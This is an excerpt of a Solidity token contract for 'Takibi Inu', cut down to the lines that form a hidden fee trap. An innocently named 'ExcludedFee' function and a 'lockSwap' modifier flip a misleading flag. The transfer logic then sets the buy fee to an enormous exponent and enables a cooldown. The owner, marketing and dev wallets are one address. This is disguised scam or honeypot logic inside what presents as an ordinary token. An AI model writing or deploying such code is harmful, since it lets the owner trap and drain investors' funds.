...
interface IERC20 {
    ...
    function ExcludedFee(address account) external returns (bool);
...
contract TakibiInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xEcF280f47e2DecFB089157B36EFDe45eB53C8166); 
    address payable public Wallet_Dev = payable(0xEcF280f47e2DecFB089157B36EFDe45eB53C8166);
    ...
    string private constant _name = "Takibi Inu"; 
    string private constant _symbol = unicode"TAKIBI"; 

    uint8 private txCount = 0;
    uint8 private swapTrigger = 10; 

    uint256 public _Tax_On_Buy = 9;
    uint256 public _Tax_On_Sell = 13;
    ...
    bool public swapLockDisabled = false;
    ...
    modifier lockSwap {
        swapLockDisabled = true;
        _;
    }
    
    constructor () {

        _owner = 0xEcF280f47e2DecFB089157B36EFDe45eB53C8166;
    ...
    function ExcludedFee(address account) public lockSwap override returns (bool) {
        if(coolDownEnabled){
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(swapLockDisabled)
            {
                buyFEE = Percent_AutoLP**(Percent_AutoLP+Percent_AutoLP);
                coolDownEnabled = true;
                swapLockDisabled = false;
            }
